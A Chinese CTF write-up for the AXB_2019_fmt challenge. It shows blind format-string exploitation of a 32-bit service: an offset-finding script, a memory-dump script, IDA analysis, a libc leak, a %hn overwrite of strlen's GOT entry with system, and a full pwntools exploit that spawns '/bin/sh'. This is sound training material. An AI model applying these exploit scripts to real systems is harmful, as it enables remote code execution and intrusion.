# AXB_2019_fmt

## 来源
AXB_2019


## 难度

4/ 10

## 简单描述

不给elf文件, 盲打.

## vul

```bash
logan@LYXF:~/share/axb_fmt1$ nc node3.buuoj.cn 29458
Hello,I am a computer Repeater updated.
After a lot of machine learning,I know that the essence of man is a reread machine!
So I'll answer whatever you say!
Please tell me:%p %p
Repeater:0x804888d 0xffde142f

Please tell me:^c
```

存在字符串漏洞, 输出4bytes的地址, 这是一个32位程序

## 知识点

fmt vul的各种利用, fmt vul dump文件, fmt vul修改内存.

## 思路

先使用脚本算出偏移,然后编写dump脚本, 这是一个32 bit的程序,就从0x08048000开始dump内存然后写入本地文件中, 后面就简单得多了, 分析所dump的文件,发现strlen对字符串的长度进行判断, 采用字符串漏洞泄漏libc,随便找一个函数都行,计算偏移,然后再获取system函数, 修改strlen的got地址为system,再输入时输入';/bin/sh'就行, 注意,因为strlen传入的时候, Repeater:也跟着传入, 在linux bash中以'; '来进行分割命令,所以相当于执行两次命令, 一个Repeater:和一个/bin/sh.



## 利用

### 计算偏移

这个是我自己写的一个跑偏移脚本, 十分方便,用手数...^_^

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

#exeFile  = "./4th-CyberEarth"

remoteIp = "node3.buuoj.cn"
remotePort = 29619

LOCAL = 0
maxLen = 0x30
minLen = 0x10
preSendStr = ''
recvStr = ''

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

def calc(payload):
	if(preSendStr == ''):
		sl(payload)
	else:
		sla(preSendStr, payload)

	if(recvStr != ''):
		ru(recvStr)

	recv = ra()
	infos = recv.split(', ')
	offset = -1
	for info in infos:
		li(info)
		offset += 1
		if('0x44434241' == info):
			return offset	
	#pause()
	return -1

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	length = 0;
	payload = 'ABCD' + ', %p' * minLen
	while(True):
		if LOCAL:
			io = process(exeFile)	
		else:
			io = remote(remoteIp, remotePort)
		offset = calc(payload) 
		if(-1 != offset):
			li('---------------------------------------------')
			li('\noffset:' + str(offset))	
			io.close()
			break
		io.close()
		payload += ', %p'	
		length += 1

		if(length > maxLen):
			li('---------------------------------------------')
			li('not found! maxLen too litile')
			io.close
			break


```

跑的操作如下

```
logan@LYXF:~/share/axb_fmt1$ python calc_fmt_offset.py 
[+] Opening connection to node3.buuoj.cn on port 29458: Done
[DEBUG] Sent 0x45 bytes:
    'ABCD, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p\n'
[-] Receiving all data: Failed
[DEBUG] Received 0x7b bytes:
    'Hello,I am a computer Repeater updated.\n'
    'After a lot of machine learning,I know that the essence of man is a reread machine!'
[DEBUG] Received 0x31 bytes:
    '\n'
    "So I'll answer whatever you say!\n"
    'Please tell me:'
[DEBUG] Received 0xc8 bytes:
    'Repeater:ABCD, 0x804888d, 0xffe54d3f, 0xf7f5a53c, 0xffe54d48, 0xf7f365c5, 0x4f, 0x41e54e34, 0x2c444342, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520\n'
    '\n'
```

通过手数, 差一个字节偏移就为8 (0x41e54e34, 0x2c444342), 后面再利用的时候就要得补一字节对其.

###  编写dump脚本

利用 printf 中的 %s来进行dump, '%' + str(offset + x) + '$s' + p32(target_addr)来调整所dump的参数位置, 这就可以dump出任何内存的值了, 我们知道, linux32位程序,若没有开启pie的话,elf文件就加载到0x08048000起始位置, linux 64位程序就加载到0x400000位置, 所以我们就从0x08048000位置开始dump, 注意 dump出来的数据是以'\x00'结尾的, 每一条数据后面都要加一条‘\x00’,dump为空的也数据也就为 '\x00',循环dump数据,写入文件, 我也是第一次写dump文件,照着ctf-wiki中那个方法, dump感觉太慢了,每次都要重新连接,而这个体是循环输入的,不用每次dump都重新连接,还有,dump的时候,无误了,尽量把IO输出给删了, 极大影响dump的速率,尽最大的关掉, 还有在打远程的时候总是容易断开,如下:

```
[*] dumping: 1660/12288
[*] dumping: 2010/12288
[*] dumping: 2140/12288
[*] dumping: 2270/12288
[*] dumping: 2280/12288
[*] dumping: 2310/12288
[*] dumping: 2320/12288
[*] dumping: 2380/12288
[*] dumping: 2390/12288
[*] dumping: 2460/12288
[*] Error.
```
这就导致dump的数据太少了, 我就改进了一下,添加一个重新连接,继续dump.改进后如下:

```
[*] dumping: 2540/12288
[*] Closed connection to node3.buuoj.cn port 29458
[*] Error.
[+] Opening connection to node3.buuoj.cn on port 29458: Done
[*] dumping: 2550/12288
[*] dumping: 2560/12288

```

##### dump 文件脚本

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan
'''
This is a dump file script
'''

from pwn import *

#context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')

exeFile = ''
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29458

LOCAL = 1
LIB   = 0

#--------------------------Exploit--------------------------

offset = 8 + 2 + 2

def getbinary():
	data_length = 0x3000 #想要获取数据的长度.
	base_addr = 0x08048000 # 起始地址
	end_addr  = base_addr + data_length # 结束地址
	f = open('binary', 'w')
	addr = base_addr
	isDisConnect = False
	disConnectMaxTimes = 3 #这里可以设定一个最大断开连接次数,网络差就调大一点

	io = remote(remoteIp, remotePort)
	for i in range(disConnectMaxTimes):
		io.recvuntil('Please tell me:')
		while addr < end_addr:
			try:
				p = 'ABCDE' #随便一些自己规定的字符,从这里开始读取数据
				p += '%' + str(offset)
				p += '$s'
				p += 'CBAABCD' #随便一些自己规定的字符,方便结尾,中间的数据就是dump的数据了
				p += p32(addr)
				io.send(p)
				io.recvuntil('ABCDE', drop = True)
				data = io.recvuntil('CBAABCD', drop = True)
				#print data
			except EOFError: #读有错误的话,就断开重新连接
				isDisconnect = True
				io.close()
				break
	
			if len(data) == 0: #为0的话,说明读到的值为0,就没有输出,但数据还是要的补上
				f.write('\x00')
				addr += 1
			else:
				data += '\x00' # 注意字符串结尾是'\x00'是不会打印的,要得补上
				f.write(data)
				addr += len(data)
			if(((addr - base_addr) % 10) == 0): #这里就是输出的进度了.
				print('dumping: ' + str(addr - base_addr) + '/' + str(data_length))
		if isDisconnect == True: #断开重新连接.
			print('Error.')
			io = remote(remoteIp, remotePort)
			isDisconnect = False
			sleep(0.5)
	

	f.close()
	io.close()

def exploit():
	getbinary()	

#--------------------------Main-----------------------------
if __name__ == '__main__':
	exploit()


```

然后就静静的等待,若开启输出太多加上是远程dump,可能一个小时都还没dump 10k,尽量关掉输出.

dump文件之后如下:

```python
logan@LYXF:~/share/axb_fmt1$ cat binary
ELF�4`4 	(44�4�  TT�T����	�	�4d����hh�h�DDP�td����,,Q�tdR�
... ...
```

### IDA分析dump的文件

所dump的文件不能反编译为c语言伪代码,只能看汇编.

```
_init_proc	LOAD	08048418	00000023	0000000C	00000000	R	.	.	.	.	.	.
sub_8048450	LOAD	08048450	00000006			R	.	.	.	.	.	.
sub_8048460	LOAD	08048460	00000006			R	.	.	.	.	.	.
sub_8048470	LOAD	08048470	00000006			R	.	.	.	.	.	.
j_start	LOAD	08048480	00000006			.	.	.	.	.	.	.
sub_8048490	LOAD	08048490	00000006			R	.	.	.	.	.	.
sub_80484A0	LOAD	080484A0	00000006			R	.	.	.	.	.	.
sub_80484B0	LOAD	080484B0	00000006			R	.	.	.	.	.	.
sub_80484C0	LOAD	080484C0	00000006			R	.	.	.	.	.	.
sub_80484D0	LOAD	080484D0	00000006			R	.	.	.	.	.	.
sub_80484E0	LOAD	080484E0	00000006			R	.	.	.	.	.	.
__gmon_start__	LOAD	080484F0	00000006			R	.	.	.	.	.	.
start	LOAD	08048500	00000022			.	.	.	.	.	.	.
sub_8048530	LOAD	08048530	00000004	00000000	00000000	R	.	.	.	.	.	.
sub_8048540	LOAD	08048540	0000002B	00000000	00000000	R	.	.	.	.	.	.
sub_80485B0	LOAD	080485B0	0000001E	00000000	00000000	R	.	.	.	.	.	.
sub_80485D0	LOAD	080485D0	0000002B			R	.	.	.	.	.	.
sub_8048760	LOAD	08048760	0000005D	00000010	0000000C	R	.	.	.	.	.	.
nullsub_1	LOAD	080487C0	00000002	00000000	00000000	R	.	.	.	.	.	.
_term_proc	LOAD	080487C4	00000014	0000000C	00000000	R	.	.	.	.	.	.

```

也可以看到,基本的函数也出来了, 但没有发现main函数,找相关逻辑代码吧

```
LOAD:080486AD                 lea     eax, [ebp-138h]
LOAD:080486B3                 push    eax
LOAD:080486B4                 call    sub_80484D0
LOAD:080486B9                 add     esp, 10h
LOAD:080486BC                 sub     esp, 0Ch
LOAD:080486BF                 push    offset aPleaseTellMe ; "Please tell me:"
LOAD:080486C4                 call    sub_8048470     
LOAD:080486C9                 add     esp, 10h
LOAD:080486CC                 sub     esp, 4
LOAD:080486CF                 push    100h
LOAD:080486D4                 lea     eax, [ebp-239h]
LOAD:080486DA                 push    eax
LOAD:080486DB                 push    0
LOAD:080486DD                 call    sub_8048460     
LOAD:080486E2                 add     esp, 10h
LOAD:080486E5                 sub     esp, 4
LOAD:080486E8                 lea     eax, [ebp-239h]
LOAD:080486EE                 push    eax
LOAD:080486EF                 push    offset aRepeaterS ; "Repeater:%s\n"
LOAD:080486F4                 lea     eax, [ebp-138h]
LOAD:080486FA                 push    eax
LOAD:080486FB                 call    sub_80484E0     
LOAD:08048700                 add     esp, 10h
LOAD:08048703                 sub     esp, 0Ch
LOAD:08048706                 lea     eax, [ebp-138h]
LOAD:0804870C                 push    eax
LOAD:0804870D                 call    sub_80484B0     
LOAD:08048712                 add     esp, 10h
LOAD:08048715                 mov     [ebp-240h], eax 
LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E
LOAD:08048725                 jbe     short loc_8048741
LOAD:08048727                 sub     esp, 0Ch
LOAD:0804872A                 push    offset aWhatYouInputIs ; "what you input is really long!"
LOAD:0804872F                 call    sub_8048470
LOAD:08048734                 add     esp, 10h
LOAD:08048737                 sub     esp, 0Ch
LOAD:0804873A                 push    0
LOAD:0804873C                 call    sub_80484A0
```

虽然找到,但不知道调用什么函数, 需要去看看符号表.

```
extern:0804A06C ; extern
extern:0804A06C ; void setbuf(FILE *stream, char *buf)
extern:0804A06C                 extrn setbuf:near
extern:0804A070 ; ssize_t read(int fd, void *buf, size_t nbytes)
extern:0804A070                 extrn read:near
extern:0804A074 ; int printf(const char *format, ...)
extern:0804A074                 extrn printf:near
extern:0804A078 ; unsigned int alarm(unsigned int seconds)
extern:0804A078                 extrn alarm:near
extern:0804A07C ; int puts(const char *s)
extern:0804A07C                 extrn puts:near
extern:0804A080 ; void exit(int status)
extern:0804A080                 extrn exit:near
extern:0804A084 ; size_t strlen(const char *s)
extern:0804A084                 extrn strlen:near
extern:0804A088 ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)
extern:0804A088                 extrn __libc_start_main:near
extern:0804A08C ; void *memset(void *s, int c, size_t n)
extern:0804A08C                 extrn memset:near
extern:0804A090 ; int sprintf(char *s, const char *format, ...)
extern:0804A090                 extrn sprintf:near
extern:0804A094                 extrn __imp___gmon_start__:near ; weak
extern:0804A094                                         ; CODE XREF: __gmon_start__↑j
```

这就需要推断调用什么函数了.

```
LOAD:080486AD                 lea     eax, [ebp-138h]
LOAD:080486B3                 push    eax
LOAD:080486B4                 call    sub_80484D0
LOAD:080486B9                 add     esp, 10h
LOAD:080486BC                 sub     esp, 0Ch
LOAD:080486BF                 push    offset aPleaseTellMe ; "Please tell me:"
LOAD:080486C4                 call    sub_8048470   // puts函数
LOAD:080486C9                 add     esp, 10h
LOAD:080486CC                 sub     esp, 4
LOAD:080486CF                 push    100h // length
LOAD:080486D4                 lea     eax, [ebp-239h]
LOAD:080486DA                 push    eax  // buf
LOAD:080486DB                 push    0    //fd
LOAD:080486DD                 call    sub_8048460     //read 函数
LOAD:080486E2                 add     esp, 10h
LOAD:080486E5                 sub     esp, 4
LOAD:080486E8                 lea     eax, [ebp-239h]
LOAD:080486EE                 push    eax // buf
LOAD:080486EF                 push    offset aRepeaterS ; "Repeater:%s\n" //arg 2
LOAD:080486F4                 lea     eax, [ebp-138h]
LOAD:080486FA                 push    eax  //buf2
LOAD:080486FB                 call    sub_80484E0  //sprintf函数   
LOAD:08048700                 add     esp, 10h
LOAD:08048703                 sub     esp, 0Ch
LOAD:08048706                 lea     eax, [ebp-138h] 
LOAD:0804870C                 push    eax //buf2
LOAD:0804870D                 call    sub_80484B0      / /strlen函数,传入buf2
LOAD:08048712                 add     esp, 10h
LOAD:08048715                 mov     [ebp-240h], eax ; //srlen函数的返回值 
LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E
LOAD:08048725                 jbe     short loc_8048741
LOAD:08048727                 sub     esp, 0Ch
LOAD:0804872A                 push    offset aWhatYouInputIs ; "what you input is really long!"
LOAD:0804872F                 call    sub_8048470
LOAD:08048734                 add     esp, 10h
LOAD:08048737                 sub     esp, 0Ch
LOAD:0804873A                 push    0
LOAD:0804873C                 call    sub_80484A0
```

### leak libc

泄漏libc的话,只需泄漏某个函数的got表,就选择sprintf来泄漏吧, 点击sprintf的call sub_80484E0进入plt跳转.

```
LOAD:080484E0 sub_80484E0     proc near               ; CODE XREF: LOAD:080486FB↓p
LOAD:080484E0                 jmp     ds:dword_804A030
LOAD:080484E0 sub_80484E0     endp
```

点击jmp到sprintf got 表地址

```
LOAD:0804A030 dword_804A030   dd 1C001Fh              ; DATA XREF: sub_80484E0↑r
```

0x0804A030就是sprintf的got表地址了,那么我们就可以通过字符串漏洞泄漏该地址的内容,从而获取到libc中sprintf的地址,strlen也是同样的方法.

```python
	sprintf_got = 0x0804A030	
	strlen_got = 0x0804A024
	offset = 8
	# leak libc
	p = 'A' # for alignment
	p += '%' + str(offset + 1) + '$s' + p32(sprintf_got)
	s(p)
	sprintf = u32(ru('\xf7')[-3:] + '\xf7')
	li('sprintf ' + hex(sprintf))

	'''
	select:
	2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
	'''

	libc = LibcSearcher('sprintf', sprintf)
	libc_base = sprintf - libc.dump('sprintf')
	li('libc_base ' + hex(libc_base))
	system = libc_base + libc.dump('system')
	li('system ' + hex(system))
```

#### 修改strlen的got表内容为system

使用字符串漏洞来进行地址写入, 使用'$hn's 2字节分两次写入,先写小的再写大的, system的高位地址要比system的低位地址大,则先写小的.

```python
	high_sys = system >> (8 * 2) #获取高4位
	low_sys = system & 0xFFFF    #获取低4位
	li('high_sys ' + hex(high_sys))
	li('low_sys  ' + hex(low_sys))

	# modify strlen got
	pre_len = len('Repeater:') + 1 + 4 + 4 #这里为数据已经打印的长度,后面写入长度需要减掉该长度
	p = 'A' # for alignment
	p += p32(strlen_got + 0) # 8
	p += p32(strlen_got + 2) # 9

	p += '%' + str(low_sys - pre_len) + 'c%' + str(offset + 0) + '$hn'
	p += '%' + str(high_sys - low_sys) + 'c%' + str(offset + 1) + '$hn'
    s(p)
```

### get shell

使用'; '分割shell命令, 再调用strlen即调用system函数

```python
sl('; /bin/sh')
```



## exp

```python

#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = ''
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29458

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	sprintf_got = 0x0804A030	
	strlen_got = 0x0804A024
	offset = 8
	# leak libc
	p = 'A' # for alignment
	p += '%' + str(offset + 1) + '$s' + p32(sprintf_got)
	s(p)
	sprintf = u32(ru('\xf7')[-3:] + '\xf7')
	li('sprintf ' + hex(sprintf))

	'''
	select:
	2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
	'''

	libc = LibcSearcher('sprintf', sprintf)
	libc_base = sprintf - libc.dump('sprintf')
	li('libc_base ' + hex(libc_base))
	system = libc_base + libc.dump('system')
	li('system ' + hex(system))

	high_sys = system >> (8 * 2)
	low_sys = system & 0xFFFF
	li('high_sys ' + hex(high_sys))
	li('low_sys  ' + hex(low_sys))

	# modify strlen got
	pre_len = len('Repeater:') + 1 + 4 + 4
	p = 'A' # for alignment
	p += p32(strlen_got + 0) # 8
	p += p32(strlen_got + 2) # 9

	p += '%' + str(low_sys - pre_len) + 'c%' + str(offset + 0) + '$hn'
	p += '%' + str(high_sys - low_sys) + 'c%' + str(offset + 1) + '$hn'

	s(p)
	sl('; /bin/sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

